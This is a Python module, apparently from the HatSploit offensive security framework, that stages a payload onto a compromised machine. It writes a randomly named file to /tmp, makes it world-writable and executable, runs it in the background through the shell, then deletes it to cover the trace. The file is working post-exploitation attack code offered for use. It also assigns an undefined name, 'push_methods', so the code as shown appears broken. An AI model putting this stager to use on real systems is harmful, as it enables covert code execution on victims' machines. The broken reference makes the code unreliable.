#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatsploit.core.cli.badges import Badges
from hatsploit.core.session.push import Push

from hatsploit.utils.string import StringTools


class Post(Push, StringTools):
    badges = Badges()

    post_methods = push_methods

    def post(self, payload, sender, args=[], payload_args="", post='printf',
             location='/tmp', delim=';', linemax=100):
        if post in self.post_methods:
            self.badges.print_process("Sending payload stage...")

            filename = self.random_string(8)
            path = location + '/' + filename

            self.post_methods[post].push(payload, sender, location, args, linemax)

            self.badges.print_process("Executing payload...")
            sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
        else:
            self.badges.print_error("Invalid post method!")
